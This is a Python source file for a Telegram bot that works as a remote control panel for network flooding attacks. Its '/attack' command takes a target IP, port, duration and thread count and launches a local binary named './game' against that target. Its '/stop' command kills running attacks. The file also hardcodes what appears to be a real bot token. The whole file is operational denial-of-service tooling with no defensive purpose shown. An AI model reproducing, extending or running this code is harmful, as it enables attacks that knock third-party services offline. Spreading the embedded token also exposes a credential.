import asyncio
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
import subprocess

TOKEN = '7821639514:AAH74HXLB2ap3IF1mwr5JEELzATQ_p7H3bU'
GROUP_ID = -4801647527
BINARY_PATH = './game'
running = {}

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.id != GROUP_ID:
        return

    if len(context.args) != 4:
        await update.message.reply_text("Usage: /attack <ip> <port> <time> <threads>")
        return

    ip, port, time_sec, threads = context.args
    cmd = [BINARY_PATH, ip, port, time_sec, threads]

    try:
        process = subprocess.Popen(cmd)
        running[process.pid] = process
        await update.message.reply_text(f"Attack started! PID: {process.pid}")
    except Exception as e:
        await update.message.reply_text(f"Error: {e}")

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_chat.id != GROUP_ID:
        return

    if len(context.args) != 1:
        await update.message.reply_text("Usage: /stop <pid>")
        return

    try:
        pid = int(context.args[0])
        if pid in running:
            running[pid].terminate()
            await update.message.reply_text(f"Stopped attack with PID {pid}")
            del running[pid]
        else:
            await update.message.reply_text("PID not found.")
    except Exception as e:
        await update.message.reply_text(f"Error: {e}")

async def main():
    app = ApplicationBuilder().token(TOKEN).build()

    app.add_handler(CommandHandler("attack", attack))
    app.add_handler(CommandHandler("stop", stop))

    await app.start()
    await app.updater.start_polling()
    await app.idle()

if __name__ == '__main__':
    asyncio.run(main())
